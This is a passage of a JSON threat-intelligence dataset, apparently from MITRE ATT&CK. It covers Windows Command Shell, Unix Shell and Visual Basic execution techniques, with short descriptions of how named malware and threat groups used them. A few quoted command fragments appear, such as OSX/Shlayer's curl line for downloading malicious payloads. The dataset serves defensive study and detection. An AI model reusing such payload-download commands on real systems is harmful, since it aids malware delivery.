interface and execute commands. NanoCore uses JavaScript files."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT leverages cmd.exe to perform discovery techniques. NavRAT loads malicious shellcode and executes it in memory."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use CMD to execute a process."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE allows adversaries to execute shell commands on the infected host."}, {"id": "S0457", "name": "Netwalker", "description": "Operators deploying Netwalker have used batch scripts to retrieve the Netwalker payload."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can issue commands using cmd.exe."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and run command-line shells."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor creates a cmd.exe shell to send and receive commands from the command and control server via open pipes."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can launch a command shell interface for executing commands."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus used cmd.exe /c within a malicious macro."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can create a reverse shell on the infected endpoint using cmd.exe. OceanSalt has been executed via malicious macros."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE uses the command prompt to execute commands on the victim's machine."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used batch scripts to perform reconnaissance."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, various implants used batch scripting and cmd.exe for execution."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors spawned a new cmd.exe process to execute commands."}, {"id": "S0229", "name": "Orz", "description": "Orz can execute shell commands. Orz can execute commands with JavaScript."}, {"id": "S0594", "name": "Out1", "description": "Out1 can use native command line for execution."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has used cmd.exe to scan a compromised host for specific file extensions."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork ran a reverse shell with Meterpreter. Patchwork used JavaScript code and .SCT files on victim machines."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can execute cmd commands on a compromised host."}, {"id": "S0643", "name": "Peppy", "description": "Peppy has the ability to execute shell commands."}, {"id": "S0158", "name": "PHOREAL", "description": "PHOREAL is capable of creating reverse shell."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot can execute Windows shell commands via cmd.exe."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can use cmd.exe to run various commands as a reverse shell."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE uses cmd.exe to execute commands on the victim\u2019s machine."}, {"id": "G1040", "name": "Play", "description": "Play has used a batch script to remove indicators of its presence on compromised hosts."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to execute shell commands on the compromised host."}, {"id": "S0013", "name": "PlugX", "description": "PlugX allows actors to spawn a reverse shell on a victim."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has called cmd through a Word document macro."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a backdoor through which remote attackers can open a command-line interface."}, {"id": "S0453", "name": "Pony", "description": "Pony has used batch scripts to delete itself after execution."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke runs cmd.exe /c and sends the output to its C2."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can execute commands from its C2 server."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \" > %temp%\\PM* .tmp 2>&1\"."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can use cmd.exe for execution on victim systems."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt has used cmd.exe for execution."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use cmd.exe to launch itself and to execute multiple C2 commands."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses cmd.exe to execute scripts and commands on the victim\u2019s machine."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can launch a remote shell to execute commands on the victim\u2019s machine."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used cmd.exe and batch scripts to execute commands."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use the Windows Command Shell for execution."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has used cmd.exe to execute commmands."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses cmd.exe to read and execute a file stored on an infected USB device as part of initial installation."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA uses cmd.exe to execute commands."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can use cmd.exe for execution on compromised hosts."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has executed commands using cmd.exe /c."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used the Windows Command Prompt to execute commands."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can launch a remote command line to execute commands on the victim\u2019s machine."}, {"id": "S0375", "name": "Remexi", "description": "Remexi silently executes received commands with cmd.exe."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT uses cmd.exe to execute commands and run scripts on the victim's machine."}, {"id": "S0496", "name": "REvil", "description": "REvil can use the Windows command line to delete volume shadow copies and disable recovery."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor uses cmd.exe to execute commands on the victim\u2019s machine."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun has executed commands using cmd.exe /c \"<command> > <%temp%>\\AM<random>. tmp\" 2>&1."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can open cmd.exe to enable command execution."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood uses cmd.exe on the victim's computer."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses Windows Script Components."}, {"id": "S0148", "name": "RTM", "description": "RTM uses the command line and rundll32.exe to execute."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT uses a batch file to kill a security program task and then attempts to remove itself."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used cmd.exe to create a Registry entry to establish persistence."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has provided the ability to execute shell commands on a compromised host."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear initial loaders will also drop a malicious Windows batch file, available via open source GitHub repositories, that disables Microsoft Defender functionality."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used cmd.exe and .bat scripts for execution."}, {"id": "S0074", "name": "Sakula", "description": "Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell."}, {"id": "S0370", "name": "SamSam", "description": "SamSam uses custom batch scripts to execute some of its components."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can use a remote command module for execution via the Windows command line."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to run cmd.exe or other interactive processes on a compromised computer."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use the command shell to execute commands on a compromised host."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of executing commands."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt uses cmd.exe to create a reverse shell on the infected endpoint."}, {"id": "S0185", "name": "SEASHARPEE", "description": "SEASHARPEE can execute commands on victims."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper can execute shell commands against cmd."}, {"id": "S0639", "name": "Seth-Locker", "description": "Seth-Locker can execute commands via the command line shell."}, {"id": "S1019", "name": "Shark", "description": "Shark has the ability to use CMD to execute commands."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can use cmd.exe to execute plugins and to send command output to  specified SMB shares."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage can execute arbitrary commands with the command line."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can be issued a command shell function from the C2."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can execute shell commands on a compromised host."}, {"id": "G0091", "name": "Silence", "description": "Silence has used Windows command-line to run commands."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use cmd.exe to enable lateral movement using DCOM."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape can run cmd through an IRC channel."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can open a command line to execute commands."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can use cmd.exe to execute commands on a victim's system."}, {"id": "S0159", "name": "SNUGRIDE", "description": "SNUGRIDE is capable of executing commands and spawning a reverse shell."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug has used command line during its intrusions."}, {"id": "S0543", "name": "Spark", "description": "Spark can use cmd.exe to run commands."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has used SQL to execute JavaScript and VB scripts on the host system."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has used cmd.exe for execution."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to execute commands via cmd.exe."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to remotely execute commands."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can execute shell commands using cmd.exe."}, {"id": "G0039", "name": "Suckfly", "description": "Several tools used by Suckfly have been command-line driven."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has used cmd for execution on an infected host."}, {"id": "S0464", "name": "SYSCON", "description": "SYSCON has the ability to execute commands through cmd on a compromised host."}, {"id": "G0092", "name": "TA505", "description": "TA505 has executed commands using cmd.exe."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used cmd.exe to execute commands."}, {"id": "G1037", "name": "TA577", "description": "TA577 has used BAT files in malware execution chains."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can copy cmd.exe into the system temp folder."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can enable Windows CLI access and execute files."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask may abuse the Windows schtasks command-line tool to create \"hidden\" scheduled tasks."}, {"id": "S0164", "name": "TDTESS", "description": "TDTESS provides a reverse shell on the victim."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used batch scripts to download tools and executing cryptocurrency miners."}, {"id": "S0146", "name": "TEXTMATE", "description": "TEXTMATE executes cmd.exe to provide a reverse shell to adversaries."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used command-line interfaces for execution."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has been installed using a .bat file."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot supports execution from the command-line."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used .bat scripts and cmd for execution on compromised hosts."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used macros in Excel documents to download and deploy the malware on the user\u2019s machine."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used Windows command scripts."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to execute shell commands on the infected host."}, {"id": "S0647", "name": "Turian", "description": "Turian can create a remote shell and execute commands using cmd."}, {"id": "G0010", "name": "Turla", "description": "Turla RPC backdoors have used cmd.exe to execute commands."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of creating a reverse shell."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can uninstall malware components using a batch script. TYPEFRAME can execute commands using a shell."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT can start a command shell."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet"}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT uses cmd.exe to execute commands on the victim\u2019s machine."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has the ability to use the command line for execution on the targeted system."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can execute various Windows commands."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can execute commands on the victim's machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use cmd.exe to execute malicious code."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has used cmd to execute commands on the system."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution installation via JavaScript will launch follow-on commands via cmd.exe."}, {"id": "S0109", "name": "WEBC2", "description": "WEBC2 can open an interactive command shell."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can execute command line scripts received from C2."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can use cmd.exe to execute commands."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can open a command line interface."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern distributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used cmd.exe to execute commands on a victim's machine."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can execute commands using cmd.exe."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has a command to start an interactive shell."}, {"id": "S0117", "name": "XTunnel", "description": "XTunnel has been used to execute remote commands."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses cmd.exe to execute commands on the system."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can launch an interface where it can execute several commands on the victim\u2019s PC."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to execute shell commands."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can launch command-line shells."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can launch a reverse command shell."}]}, {"name": "Unix Shell", "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.", "detailed_description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.", "id": "T1059.004", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can execute payloads via shell scripting."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has used shell scripts to execute commands after installation and set persistence mechanisms."}, {"id": "G0096", "name": "APT41", "description": "APT41 used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used malicious shell scripts in Linux environments following access via SSH to install Linux versions of Winnti malware."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor can create a reverse shell and supports vt100 emulator formatting."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has leveraged /bin/sh and /bin/bash to execute commands on the victim machine."}, {"id": "S0077", "name": "CallMe", "description": "CallMe has the capability to create a reverse shell on victims."}, {"id": "S0220", "name": "Chaos", "description": "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER provides a BusyBox reverse shell for command and control."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker executes a bash script to establish a reverse shell."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has used a Unix shell script to run a series of commands targeting macOS."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can spawn a bash shell to enable execution on compromised hosts."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of creating a remote Bash shell and executing commands."}, {"id": "S0600", "name": "Doki", "description": "Doki has executed shell scripts with /bin/sh."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can execute arbitrary commands as root on a compromised system."}, {"id": "S0377", "name": "Ebury", "description": "Ebury can use the commands Xcsh or Xcls to open a shell with Ebury level permissions and Xxsh to open a shell with root level."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a command to execute a shell command on the system."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has the ability to create and execute commands in a remote shell for CLI."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use shell scripts for execution, such as /bin/sh -c."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used shell scripts for execution."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar uses /bin/bash to execute commands on the victim\u2019s machine."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used Unix shell scripts to execute commands in the victim environment."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity utilizes multiple Bash scripts during botnet installation stages, and the final botnet payload allows for running commands in the Bash shell."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used shell scripts to launch various services and to start/stop the QEMU virtualization."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can execute supplied shell commands and uses bash scripts to perform additional actions."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to use /bin/bash and /bin/sh to execute commands."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse is initially installed and executed through an initial shell script."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can use bash scripts to check the macOS version, download payloads, and extract bytes from files. OSX/Shlayer uses the command sh -c tail -c +1381... to extract bytes at an offset from a specified file. OSX/Shlayer uses the curl -fsL \"$url\" >$tmp_path command to download malicious payloads into a temporary directory."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the /tmp folder."}, {"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER can use a simple bash script for execution."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can execute remote commands using bash scripts."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP has the ability to receive shell commands over a Unix domain socket."}, {"id": "S0279", "name": "Proton", "description": "Proton uses macOS' .command file type to script actions."}, {"id": "S1108", "name": "PULSECHECK", "description": "PULSECHECK can use Unix shell script for command execution."}, {"id": "G0106", "name": "Rocke", "description": "Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has used pm.sh to download and install its main payload."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used shell scripts for execution."}, {"id": "S0647", "name": "Turian", "description": "Turian has the ability to use /bin/sh to execute commands."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used Brightmetricagent.exe which contains a command- line interface (CLI) library that can leverage command shells including Z Shell (zsh)."}, {"id": "S0466", "name": "WindTail", "description": "WindTail can use the open command to execute an application."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses a shell script to execute Mach-o files and osacompile commands such as, osacompile -x -o xcode.app main.applescript."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can use /bin/sh to create a reverse shell and execute commands."}]}, {"name": "Visual Basic", "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.", "detailed_description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).", "id": "T1059.005", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. "}, {"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used macros, COM scriptlets, and VBS scripts."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used VBScript to initiate the delivery of payloads."}, {"id": "G0067", "name": "APT37", "description": "APT37 executes shellcode and a VBA script to decode Base64 strings."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used VBScript to execute commands and other operational tasks."}, {"id": "G0087", "name": "APT39", "description": "APT39 has utilized malicious VBS scripts in malware."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has used malicious VBS e-mail attachments for execution."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has used VBS to install its downloader component and malicious documents with VBA macro code."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used malicious VBA code against the target system."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal's dropper creates VBS scripts on the victim\u2019s machine."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used VBS and VBE scripts for execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can create a Visual Basic script to enable persistence."}, {"id": "C0011", "name": "C0011", "description": "For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used VBscript to execute malicious code."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has executed a script named cln.vbs on compromised hosts."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use VBA to perform execution."}, {"id": "S0244", "name": "Comnie", "description": "Comnie executes VBS scripts."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used VBScript to execute malicious code."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use a VBA macro embedded in an Excel file to drop the payload."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate initial infection mechanisms include masquerading as pirated media that launches malicious VBScript on the victim."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate shellcode outputs that execute via VBScript."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used VBA scripts."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. "}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows has a command to execute VBS scripts on the victim\u2019s machine."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious has the ability to use Visual Basic scripts for execution."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used VBS scripts for code execution on comrpomised machines."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used VBA macros to display a dialog box and collect victim credentials."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used VBS scripts to help perform tasks on the victim's machine."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can execute malicious VBA macros embedded in .xlsm files."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used a Visual Basic script to run remote commands."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use VBScript to execute malicious code."}, {"id": "S0170", "name": "Helminth", "description": "One version of Helminth consists of VBScript scripts."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a VisualBasic script named MicrosoftUpdator.vbs for execution of a PowerShell keylogger."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa has used VBScript code on the victim's machine."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used obfuscated VBA string expressions."}, {"id": "G0100", "name": "Inception", "description": "Inception has used VBScript to execute malicious commands and payloads."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can run arbitrary Visual Basic scripts and commands passed to it."}, {"id": "S0528", "name": "Javali", "description": "Javali has used embedded VBScript to download malicious payloads from C2."}, {"id": "S0389", "name": "JCry", "description": "JCry has used VBS scripts. "}, {"id": "S0283", "name": "jRAT", "description": "jRAT has been distributed as HTA files with VBScript."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader can download and execute VBScript files."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can use a VBS base64 decoder function published by Motobit."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses VBS scripts for installing files and performing execution."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Visual Basic to download malicious payloads. Kimsuky has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure."}, {"id": "S0250", "name": "Koadic", "description": "Koadic performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode ."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has used VBScript to call wscript to execute a PowerShell command."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used VBA and embedded macros in Word documents to execute malicious code."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used VBScript to execute malicious code."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used VBScript."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used VBS scripts and XLS macros for execution."}, {"id": "S0582", "name": "LookBack", "description": "LookBack has used VBA macros in Microsoft Word attachments to drop additional files to the host."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail has been installed using a VBA macro."}, {"id": "G0095", "name": "Machete", "description": "Machete has embedded malicious macros within spearphishing attachments to download additional files."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used VBS scripts for execution."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has utilized a dropper containing malicious VBS scripts."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can use VBS scripts to execute malicious DLLs."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used VBS code on victims\u2019 systems."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu\u2019s dropper uses VBS files to install payloads and perform execution."}, {"id": "G0021", "name": "Molerats", "description": "Molerats used various implants, including those built with VBScript, on target machines."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu executes additional VBScript code on the victim's machine."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore uses VBS files."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has been executed through use of VBScripts."}, {"id": "G0049", "name": "OilRig", "description": 